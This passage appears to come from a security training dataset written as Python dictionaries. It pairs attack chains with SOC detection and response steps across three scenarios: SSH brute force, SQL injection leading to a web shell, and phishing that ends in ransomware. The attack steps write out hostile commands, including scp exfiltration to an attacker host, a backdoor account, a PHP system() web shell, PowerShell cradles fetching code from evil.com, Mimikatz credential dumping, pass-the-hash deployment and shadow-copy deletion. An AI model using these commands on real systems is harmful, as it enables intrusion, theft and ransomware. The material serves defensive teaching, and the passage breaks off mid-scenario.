                    {"phase": "Initial Access", "icon": "🚪",
                     "cmd": "ssh admin@203.0.113.10",
                     "desc": "Attacker logs in with the cracked credentials",
                     "output": (
                         "admin@203.0.113.10's password: Summer2024!\n"
                         "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n\n"
                         "Last login: Fri Mar 15 22:45:12 2024 from 198.51.100.42\n"
                         "admin@prod-web-01:~$ id\n"
                         "uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)"
                     ),
                     "why": "The user 'admin' is in the sudo group — the attacker doesn't even need to escalate. They have root access via sudo with the same password.",
                     "detection_hint": "Same as brute force — auth.log records the successful login. Logon from an unfamiliar external IP at 2 AM is a red flag."},

                    {"phase": "Privilege Escalation", "icon": "⬆️",
                     "cmd": "sudo -l && sudo /usr/bin/find / -perm -4000 2>/dev/null | head -20",
                     "desc": "Attacker enumerates sudo rights and SUID binaries",
                     "output": (
                         "Matching Defaults entries for admin on prod-web-01:\n"
                         "    env_reset, mail_badpass, secure_path=/usr/local/sbin:...\n\n"
                         "User admin may run the following commands on prod-web-01:\n"
                         "    (ALL : ALL) ALL\n\n"
                         "/usr/bin/sudo\n"
                         "/usr/bin/passwd\n"
                         "/usr/bin/chsh\n"
                         "/usr/bin/gpasswd\n"
                         "/usr/bin/newgrp\n"
                         "/usr/bin/su\n"
                         "/usr/bin/mount\n"
                         "/usr/bin/umount"
                     ),
                     "why": "The 'admin' user has (ALL : ALL) ALL sudo rights — full root access with the same password. Attacker is now effectively root.",
                     "detection_hint": "auth.log records every sudo command with the full command line. 'COMMAND=/usr/bin/find / -perm -4000' is an obvious recon signature."},

                    {"phase": "Persistence", "icon": "🔒",
                     "cmd": "sudo useradd -m -s /bin/bash support && sudo usermod -aG sudo support && echo 'support:Support@2024!' | sudo chpasswd",
                     "desc": "Attacker creates a backdoor admin account",
                     "output": (
                         "(no output — commands succeeded silently)\n\n"
                         "sudo grep support /etc/passwd\n"
                         "support:x:1002:1002::/home/support:/bin/bash"
                     ),
                     "why": "New sudo user 'support' with a valid password. Persistence: even if 'admin' is locked, the attacker can log back in as 'support'.",
                     "detection_hint": "auditd logs the execve() syscalls. /etc/passwd and /etc/group watch rules catch the modification. Alert on any new sudo group member."},

                    {"phase": "Data Staging", "icon": "📦",
                     "cmd": "sudo tar czf /tmp/backup.tar.gz /var/www/html && ls -lh /tmp/backup.tar.gz",
                     "desc": "Attacker bundles the website for exfiltration",
                     "output": (
                         "-rw-r--r-- 1 root root 245M Mar 16 02:30 /tmp/backup.tar.gz\n\n"
                         "sudo cat /var/www/html/config.php | grep -i 'pass\\|db'\n"
                         "define('DB_PASSWORD', 'DbProd2024!');"
                     ),
                     "why": "The attacker extracts the database password from the PHP config file and archives the entire web root for exfiltration.",
                     "detection_hint": "auditd rule watching /var/www catches the tar command. File creation in /tmp with suspicious names is a red flag."},

                    {"phase": "Exfiltration", "icon": "📤",
                     "cmd": "scp /tmp/backup.tar.gz attacker@198.51.100.42:/data/",
                     "desc": "Attacker exfiltrates the archive to their own server",
                     "output": (
                         "backup.tar.gz                          100%  245MB  12.4MB/s   00:19\n\n"
                         "ssh attacker@198.51.100.42\n"
                         "attacker@c2:~$ ls -la /data/\n"
                         "-rw-r--r-- 1 attacker attacker 256901120 Mar 16 02:31 backup.tar.gz"
                     ),
                     "why": "Data gone. 245MB of web source + database credentials transferred to attacker infrastructure in under 20 seconds.",
                     "detection_hint": "Outbound SCP from a server is highly suspicious. NetFlow/DNS logs show the C2 connection. File integrity monitoring catches the tar."}
                ],

                "defense_chain": [
                    {"phase": "Detection", "icon": "🚨",
                     "who": "SOC Tier 1 analyst",
                     "cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
                     "desc": "SIEM alert fires: 'SSH brute force detected on prod-web-01'. Analyst opens auth.log",
                     "output": (
                         "  642 203.0.113.10\n"
                         "   58 198.51.100.42\n"
                         "   12 45.33.22.11"
                     ),
                     "why": "642 failures from one IP. Immediately visible which IP is the attacker."},

                    {"phase": "Investigation", "icon": "🔍",
                     "who": "SOC Tier 1 analyst",
                     "cmd": "sudo grep 'Accepted' /var/log/auth.log | grep '203.0.113.10'",
                     "desc": "Pivotal question — did the brute force succeed?",
                     "output": (
                         "Mar 16 02:00:12 prod-web-01 sshd[4521]: Accepted password for admin from 203.0.113.10 port 54321 ssh2"
                     ),
                     "why": "CONFIRMED BREACH. The attacker got in as 'admin' at 02:00. Escalate to Tier 2 immediately."},

                    {"phase": "Timeline Reconstruction", "icon": "🕐",
                     "who": "SOC Tier 2 analyst",
                     "cmd": "sudo grep 'admin' /var/log/auth.log | grep 'COMMAND=' | tail -30",
                     "desc": "Read every sudo command the attacker ran",
                     "output": (
                         "Mar 16 02:01:15 sudo: admin : COMMAND=/usr/bin/id\n"
                         "Mar 16 02:01:42 sudo: admin : COMMAND=/bin/ls -la /var/www/html\n"
                         "Mar 16 02:02:33 sudo: admin : COMMAND=/usr/sbin/useradd -m -s /bin/bash support\n"
                         "Mar 16 02:02:45 sudo: admin : COMMAND=/usr/sbin/usermod -aG sudo support\n"
                         "Mar 16 02:03:12 sudo: admin : COMMAND=/usr/bin/tar czf /tmp/backup.tar.gz /var/www/html\n"
                         "Mar 16 02:04:45 sudo: admin : COMMAND=/usr/bin/scp /tmp/backup.tar.gz attacker@198.51.100.42:/data/"
                     ),
                     "why": "Full attack timeline visible. Attacker created a backdoor user, archived the web root, and exfiltrated. Estimated impact: web source + DB credentials leaked."},

                    {"phase": "Containment", "icon": "🛡️",
                     "who": "SOC Tier 2 analyst",
                     "cmd": "sudo ufw deny from 203.0.113.10 && sudo usermod -L admin && sudo usermod -L support && sudo passwd -l admin && sudo passwd -l support",
                     "desc": "Block attacker IP at firewall, lock both compromised accounts",
                     "output": (
                         "Rule added\n"
                         "usermod: account 'admin' password changed\n"
                         "usermod: account 'support' password changed\n"
                         "passwd: password expiry information changed."
                     ),
                     "why": "Immediate containment. Attacker cut off. Both compromised accounts locked."},

                    {"phase": "Network Isolation", "icon": "🚧",
                     "who": "SOC analyst + sysadmin",
                     "cmd": "sudo iptables -A OUTPUT -d 198.51.100.42 -j DROP && sudo ss -tnp | grep ESTABLISHED | grep 198.51.100.42",
                     "desc": "Block the attacker's C2 server, verify no active sessions remain",
                     "output": (
                         "(rule added silently)\n\n"
                         "$ sudo ss -tnp | grep ESTABLISHED | grep 198.51.100.42\n"
                         "(no output — connection gone)"
                     ),
                     "why": "Outbound C2 block prevents data exfil, beaconing, or command-and-control. Verify no live sessions with the attacker."},

                    {"phase": "Evidence Preservation", "icon": "📸",
                     "who": "SOC analyst",
                     "cmd": "sudo mkdir -p /evidence/incident-2024-03-16/ && sudo cp /var/log/auth.log /var/log/syslog /var/log/audit/audit.log /evidence/incident-2024-03-16/ && sudo tar czf /evidence/incident-2024-03-16/home-admin.tar.gz /home/admin",
                     "desc": "Copy all relevant logs and home directory for forensic review",
                     "output": (
                         "(directories created and files copied)\n"
                         "/evidence/incident-2024-03-16/\n"
                         "├── auth.log\n"
                         "├── syslog\n"
                         "├── audit.log\n"
                         "└── home-admin.tar.gz"
                     ),
                     "why": "Chain of custody matters. Before rotating logs or rebuilding, preserve everything. Legal/HR may need it."},

                    {"phase": "Credential Rotation", "icon": "🔑",
                     "who": "SOC analyst + sysadmin",
                     "cmd": "sudo passwd admin && sudo passwd support && mysql -u root -p -e \"ALTER USER 'webapp'@'localhost' IDENTIFIED BY 'NewDbPass2024#';\"",
                     "desc": "Rotate every credential the attacker touched",
                     "output": (
                         "New password: (entered by admin)\n"
                         "Retype new password: (entered by admin)\n"
                         "passwd: password updated successfully\n\n"
                         "(MySQL password changed)"
                     ),
                     "why": "Both Linux passwords AND the MySQL DB password were leaked. Rotate everything. The attacker has both from the exfiltrated config.php."},

                    {"phase": "Remediation", "icon": "🔧",
                     "who": "Sysadmin + security team",
                     "cmd": "sudo apt install fail2ban && sudo systemctl enable --now fail2ban && sudo sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart ssh",
                     "desc": "Deploy fail2ban, disable SSH password auth, require SSH keys",
                     "output": (
                         "Created symlink /etc/systemd/system/multi-user.target.wants/fail2ban.service\n"
                         "fail2ban.service is active\n\n"
                         "(sshd_config modified, ssh restarted)"
                     ),
                     "why": "Root cause fixes. fail2ban prevents future brute force. SSH keys eliminate the entire attack class."}
                ],

                "impact": {
                    "what_was_leaked": "245MB of web application source code + database credentials (config.php)",
                    "downtime": "0 minutes (server remained up, but credentials must be rotated)",
                    "cost": "Estimated 40 hours of incident response + credential rotation across all systems using the leaked DB password",
                    "root_cause": "Single-factor SSH authentication with a weak password in the top-10k leaked passwords list",
                    "fixes": [
                        "Disable SSH password authentication globally",
                        "Enforce SSH keys for all users",
                        "Add MFA for sudo/privileged operations",
                        "Deploy fail2ban with a 1-hour ban time on all servers",
                        "Alert on any external IP with >50 failed SSH logins in 5 minutes",
                        "Store DB credentials in a secrets manager, not in source files"
                    ]
                }
            },

            # ============================================================
            # SCENARIO 2 — WEB APP SQLi → SHELL → LATERAL MOVEMENT
            # ============================================================
            {
                "id": "atk_2",
                "title": "Web SQLi → Web Shell → Lateral Movement",
                "icon": "💉",
                "color": "#e67e22",
                "severity": "CRITICAL",
                "target": "Web app on prod-web-02 (Ubuntu, Apache, PHP, MySQL)",
                "duration": "6 hours from initial recon to full network compromise",
                "summary": "Attacker finds SQL injection in a product page, dumps the users table, logs in as admin, exploits a file upload to get a web shell, then pivots through the internal network to the database server.",

                "attack_chain": [
                    {"phase": "Reconnaissance", "icon": "🔍",
                     "cmd": "whatweb http://203.0.113.20 && dirb http://203.0.113.20",
                     "desc": "Attacker fingerprints the tech stack and enumerates directories",
                     "output": (
                         "http://203.0.113.20 [200 OK] Apache[2.4.41], Country[UNITED STATES][US],\n"
                         "  HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41], IP[203.0.113.20],\n"
                         "  JQuery[3.5.1], PHP[7.4.3], X-Powered-By[PHP/7.4.3]\n\n"
                         "+ http://203.0.113.20/admin (CODE:301|SIZE:178)\n"
                         "+ http://203.0.113.20/uploads (CODE:301|SIZE:178)\n"
                         "+ http://203.0.113.20/login.php (CODE:200|SIZE:2845)\n"
                         "+ http://203.0.113.20/product.php (CODE:200|SIZE:4523)\n"
                         "+ http://203.0.113.20/phpinfo.php (CODE:200|SIZE:94234)"
                     ),
                     "why": "PHP 7.4.3 + Apache + JQuery. Exposed admin, uploads, login, product page, and phpinfo (info disclosure). Directory listing enabled.",
                     "detection_hint": "Access log shows mass 404s from a single IP — clear sign of automated enumeration (dirb/gobuster)."},

                    {"phase": "SQL Injection Discovery", "icon": "💉",
                     "cmd": "sqlmap -u 'http://203.0.113.20/product.php?id=1' --batch --dbs",
                     "desc": "Attacker tests the product page for SQL injection",
                     "output": (
                         "[INFO] testing connection to the target URL\n"
                         "[INFO] testing if GET parameter 'id' is dynamic\n"
                         "[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable\n"
                         "[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable\n"
                         "[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable\n"
                         "[INFO] GET parameter 'id' is 'Generic UNION query' injectable\n"
                         "[INFO] the back-end DBMS is MySQL\n"
                         "available databases [5]:\n"
                         "[*] information_schema\n"
                         "[*] mysql\n"
                         "[*] production_app\n"
                         "[*] sys\n"
                         "[*] test"
                     ),
                     "why": "The 'id' parameter is injectable via multiple techniques. Attacker now has full database access.",
                     "detection_hint": "Access log shows payloads with ' OR 1=1', UNION SELECT, and 'AND SLEEP(5)' — obvious SQLi attempts. WAF should have blocked this."},

                    {"phase": "Credential Dump", "icon": "🗄️",
                     "cmd": "sqlmap -u 'http://203.0.113.20/product.php?id=1' -D production_app -T users --dump --batch",
                     "desc": "Attacker dumps the users table",
                     "output": (
                         "Database: production_app\n"
                         "Table: users\n"
                         "[3 entries]\n"
                         "+----+-------------+----------------------------------+----------+\n"
                         "| id | email       | password                         | username |\n"
                         "+----+-------------+----------------------------------+----------+\n"
                         "| 1  | admin@x.com | 5f4dcc3b5aa765d61d8327deb882cf99 | admin    |\n"
                         "| 2  | bob@x.com   | e10adc3949ba59abbe56e057f20f883e | bob      |\n"
                         "| 3  | alice@x.com | 25d55ad283aa400af464c76d713c07ad | alice    |\n"
                         "+----+-------------+----------------------------------+----------+\n\n"
                         "[INFO] using hash method 'md5_generic_passwd'\n"
                         "[INFO] cracked password 'password' for user 'admin'\n"
                         "[INFO] cracked password '123456' for user 'bob'"
                     ),
                     "why": "MD5 hashes + weak passwords. Admin credentials recovered in seconds.",
                     "detection_hint": "Mass SELECT queries from a single source. MySQL general log shows the queries. WAF should flag UNION SELECT patterns."},

                    {"phase": "Admin Login", "icon": "🚪",
                     "cmd": "curl -X POST http://203.0.113.20/login.php -d 'username=admin&password=password' -c cookies.txt",
                     "desc": "Attacker logs into admin panel with cracked credentials",
                     "output": (
                         "HTTP/1.1 200 OK\n"
                         "Set-Cookie: PHPSESSID=abc123def456; path=/\n\n"
                         "<html><body>\n"
                         "<h1>Welcome back, admin</h1>\n"
                         "<p>You have 3 new messages.</p>\n"
                         "</body></html>"
                     ),
                     "why": "Admin session obtained. Attacker now has full application privileges.",
                     "detection_hint": "Successful login from an unfamiliar IP. Rate limit on login attempts would have slowed the SQLi-dump-then-login attack."},

                    {"phase": "Web Shell Upload", "icon": "🐚",
                     "cmd": "curl -X POST http://203.0.113.20/admin/upload.php -F 'file=@shell.php' -b cookies.txt",
                     "desc": "Attacker uploads a PHP web shell through the admin file upload feature",
                     "output": (
                         "HTTP/1.1 200 OK\n\n"
                         "{\"success\":true,\"message\":\"File uploaded\",\"path\":\"/uploads/shell.php\"}"
                     ),
                     "why": "The upload feature accepts PHP. The uploads folder executes PHP. Web shell is now live at /uploads/shell.php.",
                     "detection_hint": "POST to /admin/upload.php with an application/x-php content type. File integrity monitoring on /uploads/ would catch the new PHP file."},

                    {"phase": "Remote Code Execution", "icon": "💻",
                     "cmd": "curl 'http://203.0.113.20/uploads/shell.php?cmd=id' && curl 'http://203.0.113.20/uploads/shell.php?cmd=cat+/etc/passwd'",
                     "desc": "Attacker runs OS commands through the web shell",
                     "output": (
                         "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n"
                         "root:x:0:0:root:/root:/bin/bash\n"
                         "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                         "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                         "mysql:x:110:115:MySQL Server:/nonexistent:/bin/false"
                     ),
                     "why": "Web shell runs as www-data. Attacker can now execute any OS command on the web server.",
                     "detection_hint": "GET requests with ?cmd= are obvious web shell usage. PHP errors mentioning shell_exec or system() would appear in error.log."},

                    {"phase": "Lateral Movement", "icon": "🕸️",
                     "cmd": "curl 'http://203.0.113.20/uploads/shell.php?cmd=cat+/var/www/html/config.php' && curl 'http://203.0.113.20/uploads/shell.php?cmd=mysql+-h+10.0.0.50+-u+root+-pDbPass2024!+-e+%22SHOW+DATABASES%22'",
                     "desc": "Attacker extracts DB credentials from config, connects to the internal DB server",
                     "output": (
                         "define('DB_HOST', '10.0.0.50');\n"
                         "define('DB_USER', 'root');\n"
                         "define('DB_PASSWORD', 'DbPass2024!');\n\n"
                         "+--------------------+\n"
                         "| Database           |\n"
                         "+--------------------+\n"
                         "| production_app     |\n"
                         "| customer_data      |\n"
                         "| hr_records         |\n"
                         "+--------------------+"
                     ),
                     "why": "Database credentials reused. Attacker pivots from the web server to the internal DB server on 10.0.0.50 — inside the corporate network.",
                     "detection_hint": "Outbound MySQL connections from the web server to 10.0.0.50 on port 3306. Network segmentation should prevent this — but most flat networks allow it."}
                ],

                "defense_chain": [
                    {"phase": "Detection", "icon": "🚨",
                     "who": "SOC Tier 1 analyst",
                     "cmd": "sudo grep -iE 'union.*select|<script>|cmd=' /var/log/apache2/access.log | tail -20",
                     "desc": "WAF alert fires on SQLi pattern. Analyst searches Apache access log",
                     "output": (
                         "203.0.113.30 - - [16/Mar/2024:14:35:47] \"GET /product.php?id=1' UNION SELECT 1,user(),database()-- - HTTP/1.1\" 500 1234 \"-\" \"sqlmap/1.7.2\"\n"
                         "203.0.113.30 - - [16/Mar/2024:14:42:12] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 45 \"-\" \"curl/7.81.0\"\n"
                         "203.0.113.30 - - [16/Mar/2024:14:42:15] \"GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1\" 200 2048 \"-\" \"curl/7.81.0\""
                     ),
                     "why": "The User-Agent 'sqlmap/1.7.2' confirms automated SQLi. Then 'curl' hits /uploads/shell.php with ?cmd= — web shell usage is obvious."},

                    {"phase": "Investigation", "icon": "🔍",
                     "who": "SOC Tier 2 analyst",
                     "cmd": "sudo find /var/www -name '*.php' -newermt '1 day ago' && sudo cat /var/www/html/uploads/shell.php",
                     "desc": "Locate all recent PHP files, read the shell",
                     "output": (
                         "/var/www/html/uploads/shell.php\n\n"
                         "<?php\n"
                         "if(isset($_REQUEST['cmd'])){\n"
                         "    system($_REQUEST['cmd']);\n"
                         "}\n"
                         "?>"
                     ),
                     "why": "Confirms the web shell. Simple system() wrapper runs any OS command as www-data. Preserve this file as evidence before deleting."},

                    {"phase": "Lateral Movement Check", "icon": "🕸️",
                     "who": "SOC Tier 2 analyst",
                     "cmd": "sudo ss -tnp | grep ':3306' && sudo grep -i 'mysql' /var/log/apache2/access.log | tail -5",
                     "desc": "Check if attacker is pivoting to the internal database",
                     "output": (
                         "ESTAB 0 0 10.0.0.10:45678 10.0.0.50:3306 users:((\"apache2\",pid=1234,fd=5))\n\n"
                         "203.0.113.30 - - [16/Mar/2024:14:43:01] \"GET /uploads/shell.php?cmd=mysql+-h+10.0.0.50...\" 200 1024"
                     ),
                     "why": "Attacker is connected to the internal DB server through the web shell. Escalate immediately — this is now a network-wide incident."},

                    {"phase": "Containment — Web Server", "icon": "🛡️",
                     "who": "SOC analyst + sysadmin",
                     "cmd": "sudo iptables -I INPUT -s 203.0.113.30 -j DROP && sudo rm /var/www/html/uploads/shell.php && sudo systemctl restart apache2",
                     "desc": "Block attacker IP, remove the web shell, restart Apache to kill sessions",
                     "output": (
                         "(firewall rule added)\n"
                         "(shell removed)\n"
                         "Job for apache2.service completed successfully."
                     ),
                     "why": "Block attacker, remove backdoor, kill any active sessions. Attacker is out of the web server."},

                    {"phase": "Network Segmentation", "icon": "🚧",
                     "who": "Network engineer",
                     "cmd": "sudo iptables -A OUTPUT -p tcp --dport 3306 -d 10.0.0.50 -j DROP && sudo iptables -A OUTPUT -d 203.0.113.30 -j DROP",
                     "desc": "Block web server from reaching the internal DB. Block attacker C2.",
                     "output": (
                         "(rules added silently)\n\n"
                         "sudo ss -tn | grep ':3306'\n"
                         "(no output — connection severed)"
                     ),
                     "why": "Stops the attacker from using the web server to pivot further. Network segmentation between web tier and database tier is a critical control."},

                    {"phase": "Database Server Check", "icon": "🗄️",
                     "who": "DBA + SOC analyst",
                     "cmd": "mysql -u root -p -e \"SELECT user, host, db, command, time, state FROM information_schema.processlist WHERE command != 'Sleep';\" && mysql -u root -p -e \"SELECT user, host FROM mysql.user WHERE user='root';\"",
                     "desc": "Check active DB sessions and audit accounts with remote root access",
                     "output": (
                         "(no active sessions — attacker disconnected when web shell died)\n\n"
                         "+------+-----------+\n"
                         "| user | host      |\n"
                         "+------+-----------+\n"
                         "| root | localhost |\n"
                         "| root | 10.0.0.%  |\n"
                         "+------+-----------+\n\n"
                         "⚠️  'root@10.0.0.%' allows any internal host to log in as DB root."
                     ),
                     "why": "No active attacker sessions (web shell was killed). But DB root is accessible from any internal IP — an obvious misconfiguration that let the pivot succeed."},

                    {"phase": "Evidence Preservation", "icon": "📸",
                     "who": "SOC analyst",
                     "cmd": "sudo mkdir -p /evidence/incident-2024-03-16/ && sudo cp /var/log/apache2/access.log /var/log/apache2/error.log /evidence/incident-2024-03-16/ && sudo mysqldump --all-databases > /evidence/incident-2024-03-16/db_snapshot.sql",
                     "desc": "Preserve all web logs and full DB snapshot",
                     "output": (
                         "(files copied to /evidence/incident-2024-03-16/)\n\n"
                         "ls -lh /evidence/incident-2024-03-16/\n"
                         "total 1.2G\n"
                         "access.log       245M\n"
                         "error.log         45M\n"
                         "db_snapshot.sql  912M"
                     ),
                     "why": "Apache access log is the primary evidence for SQLi and web shell activity. The DB snapshot lets forensics determine what was dumped."},

                    {"phase": "Credential Rotation", "icon": "🔑",
                     "who": "SOC analyst + DBA",
                     "cmd": "mysql -u root -p -e \"ALTER USER 'root'@'10.0.0.%' IDENTIFIED BY 'NewRootPass2024!';\" && mysql -u root -p -e \"DROP USER 'root'@'10.0.0.%';\" && mysql -u root -p -e \"CREATE USER 'webapp'@'10.0.0.10' IDENTIFIED BY 'WebAppNewPass2024!'; GRANT SELECT, INSERT, UPDATE, DELETE ON production_app.* TO 'webapp'@'10.0.0.10';\"",
                     "desc": "Rotate DB credentials, remove over-privileged access, create least-privilege user",
                     "output": (
                         "(root@10.0.0.% password changed, then user dropped)\n\n"
                         "Query OK, 0 rows affected\n"
                         "Query OK, 0 rows affected\n"
                         "Query OK, 0 rows affected\n\n"
                         "⚠️  Web server now uses least-privilege 'webapp' user, not root."
                     ),
                     "why": "Root cause fix. The web server should never have used DB root. Least-privilege user 'webapp' can only read/write production_app tables."},

                    {"phase": "Remediation", "icon": "🔧",
                     "who": "Dev + security team",
                     "cmd": "sudo nano /var/www/html/product.php && sudo apt install php-mysqli && sudo systemctl restart apache2",
                     "desc": "Fix the SQLi by switching to parameterized queries, restart Apache",
                     "output": (
                         "(code changed)\n\n"
                         "BEFORE (vulnerable):\n"
                         "$id = $_GET['id'];\n"
                         "$sql = \"SELECT * FROM products WHERE id = $id\";\n\n"
                         "AFTER (safe):\n"
                         "$stmt = $pdo->prepare('SELECT * FROM products WHERE id = ?');\n"
                         "$stmt->execute([$_GET['id']]);"
                     ),
                     "why": "Parameterized queries make SQL injection impossible — the database treats user input as data, never as SQL. Also harden upload validation, disable PHP in /uploads/, remove phpinfo.php."}
                ],

                "impact": {
                    "what_was_leaked": "Customer database contents + admin credentials + DB root password",
                    "downtime": "35 minutes (Apache + MySQL restarts)",
                    "cost": "Estimated 80 hours incident response + potential regulatory notification (customer data leaked)",
                    "root_cause": "SQL injection in product.php, MD5 password hashing, upload validation missing, DB root used by web app, flat network (no segmentation)",
                    "fixes": [
                        "Use parameterized queries everywhere — never concatenate user input into SQL",
                        "Switch from MD5 to bcrypt/Argon2 for password hashing",
                        "Validate uploads by MIME type and extension; disallow PHP in /uploads/",
                        "Never use DB root from web servers — always least-privilege accounts",
                        "Segment network: web tier → DB tier only on specific ports, no direct access",
                        "Deploy ModSecurity WAF with OWASP Core Rule Set",
                        "Enable file integrity monitoring on /var/www"
                    ]
                }
            },

            # ============================================================
            # SCENARIO 3 — PHISHING → CREDENTIAL DUMP → RANSOMWARE
            # ============================================================
            {
                "id": "atk_3",
                "title": "Phishing → LSASS Dump → Ransomware",
                "icon": "💀",
                "color": "#c0392b",
                "severity": "CRITICAL",
                "target": "Corporate Windows workstation + file server + domain controller",
                "duration": "4 days from phishing email to full network encryption",
                "summary": "A user opens a phishing attachment, Word macros spawn PowerShell that downloads Mimikatz, LSASS is dumped, domain admin creds are stolen, and ransomware is deployed across the entire network.",

                "attack_chain": [
                    {"phase": "Phishing Delivery", "icon": "📧",
                     "cmd": "(attacker sends email with 'invoice.docm' attachment)",
                     "desc": "Targeted phishing email with malicious Word macro attachment",
                     "output": (
                         "From: billing@invoices-corp.com\n"
                         "To: alice@company.com\n"
                         "Subject: URGENT: Invoice #INV-2024-3892 requires approval\n\n"
                         "Hi Alice,\n\n"
                         "Please review the attached invoice for Q1 services.\n"
                         "This must be approved by end of business today.\n\n"
                         "Attachment: invoice_2024_3892.docm (85 KB)"
                     ),
                     "why": "Classic invoice-themed phishing. Pressure + urgency + realistic sender domain. Alice is a finance employee — she opens it.",
                     "detection_hint": "Email gateway should flag external .docm attachments. User reports to SOC for verification."},

                    {"phase": "Malicious Macro Execution", "icon": "⚙️",
                     "cmd": "(Alice opens invoice.docm, enables macros, Word runs macro)",
                     "desc": "Word macro spawns PowerShell download cradle",
                     "output": (
                         "(invisible to Alice — happens in seconds)\n\n"
                         "1. winword.exe launches\n"
                         "2. Macro runs: AutoOpen()\n"
                         "3. Shell() executes:\n"
                         "   powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1'))\"\n"
                         "4. stage2.ps1 downloads mimikatz.exe to C:\\Users\\Public\\m.exe\n"
                         "5. stage2.ps1 runs: C:\\Users\\Public\\m.exe 'sekurlsa::logonpasswords' exit\n"
                         "6. credentials.txt written with all hashes"
                     ),
                     "why": "Office macro → PowerShell download cradle → Mimikatz. This is one of the most common modern attack chains. Completely fileless until stage2.ps1 lands on disk.",
                     "detection_hint": "Sysmon Event 1 shows winword.exe spawning powershell.exe with '-enc' or 'IEX DownloadString'. Office macro execution is a massive red flag."},

                    {"phase": "Credential Harvest", "icon": "🔓",
                     "cmd": "C:\\Users\\Public\\m.exe 'sekurlsa::logonpasswords' 'lsadump::sam' exit",
                     "desc": "Mimikatz reads LSASS memory and SAM database",
                     "output": (
                         "Authentication Id : 0 ; 999\n"
                         "Session           : Interactive from 1\n"
                         "User Name         : alice\n"
                         "Domain            : COMPANY\n"
                         "Logon Server      : DC01\n"
                         "        msv :\n"
                         "         [00000003] Primary\n"
                         "         * Username : alice\n"
                         "         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c\n\n"
                         "Authentication Id : 0 ; 123456\n"
                         "User Name         : DOMAIN\\dadmin\n"
                         "        msv :\n"
                         "         * Username : dadmin\n"
                         "         * NTLM     : a87f3a337d73085c45f9416be5787d86\n\n"
                         "SAM Key : 8c9f3e2a1b4d5c7e8f9a0b1c2d3e4f5a"
                     ),
                     "why": "Mimikatz extracts Alice's NTLM hash AND cached domain admin credentials (dadmin had logged into this workstation recently). Attacker now has valid creds for the entire domain.",
                     "detection_hint": "Sysmon Event 10 (process access) shows mimikatz.exe accessing lsass.exe with GrantedAccess 0x1410. This is CRITICAL — page on-call immediately."},

                    {"phase": "Lateral Movement", "icon": "🕸️",
                     "cmd": "crackmapexec smb 10.0.0.0/24 -u dadmin -H a87f3a337d73085c45f9416be5787d86 --shares",
                     "desc": "Attacker uses stolen hash to move laterally across the network",
                     "output": (
                         "SMB         10.0.0.10   445    DC01        [*] Windows Server 2019\n"
                         "SMB         10.0.0.10   445    DC01        [+] COMPANY\\dadmin a87f3a33... (Pwn3d!)\n"
                         "SMB         10.0.0.20   445    FILESRV01   [*] Windows Server 2019\n"
                         "SMB         10.0.0.20   445    FILESRV01   [+] COMPANY\\dadmin a87f3a33... (Pwn3d!)\n"
                         "SMB         10.0.0.30   445    APPSRV01    [*] Windows Server 2019\n"
                         "SMB         10.0.0.30   445    APPSRV01    [+] COMPANY\\dadmin a87f3a33... (Pwn3d!)"
                     ),
                     "why": "'Pwn3d!' means the hash works on that machine. Attacker has admin on DC01 (Domain Controller), FILESRV01 (file server), and APPSRV01 (app server). Full network control.",
                     "detection_hint": "Event 4624 with Type 3 logons across many hosts from the same account in minutes. Anomalous NTLM authentication patterns."},

                    {"phase": "Ransomware Deployment", "icon": "💀",
                     "cmd": "crackmapexec smb 10.0.0.0/24 -u dadmin -H a87f... -x 'powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://evil.com/lock.ps1\\')\"'",
                     "desc": "Attacker deploys ransomware via SMB to every Windows host",
                     "output": (
                         "SMB         10.0.0.10   445    DC01        [*] Windows Server 2019\n"
                         "SMB         10.0.0.10   445    DC01        [+] Executed command\n"
                         "SMB         10.0.0.20   445    FILESRV01   [+] Executed command\n"
                         "SMB         10.0.0.30   445    APPSRV01    [+] Executed command\n"
                         "... (250 more hosts)\n\n"
                         "lock.ps1:\n"
                         "1. vssadmin delete shadows /all /quiet\n"
                         "2. bcdedit /set recoveryenabled No\n"
                         "3. wbadmin delete catalog -quiet\n"
                         "4. Encrypt all .docx .xlsx .pdf .jpg .db with AES-256\n"
                         "5. Rename to .locked\n"
                         "6. Drop README_RANSOM.txt on every desktop"
                     ),
                     "why": "Ransomware deletes backups first (vssadmin/wbadmin/bcdedit), then encrypts everything. 250+ hosts hit in parallel via SMB. Encryption completes in under 30 minutes.",
                     "detection_hint": "Sysmon Event 11 (file created) spikes on every host. vssadmin/wbadmin commands are instant red flags. Should trigger on-call regardless of hour."}
                ],

                "defense_chain": [
                    {"phase": "Detection — Email", "icon": "🚨",
                     "who": "SOC Tier 1 analyst",
                     "cmd": "Get-MessageTrace -SenderAddress billing@invoices-corp.com -StartDate (Get-Date).AddHours(-24) | Where-Object {$_.RecipientAddress -like '*company.com'} | Select-Object RecipientAddress, Subject, Received",
                     "desc": "Email gateway alert: multiple users received invoice-themed attachments from external sender",
                     "output": (
                         "RecipientAddress                  Subject                                                Received\n"
                         "----------------                  -------                                                --------\n"
                         "alice@company.com                 URGENT: Invoice #INV-2024-3892 requires approval       3/15/2024 9:14 AM\n"
                         "bob@company.com                   URGENT: Invoice #INV-2024-3892 requires approval       3/15/2024 9:14 AM\n"
                         "carol@company.com                 URGENT: Invoice #INV-2024-3892 requires approval       3/15/2024 9:14 AM\n"
                         "... (28 more)"
                     ),
                     "why": "31 recipients, same phishing email. Bulk campaign. Block sender + quarantine email + notify users immediately."},

                    {"phase": "Detection — Endpoint", "icon": "🔓",
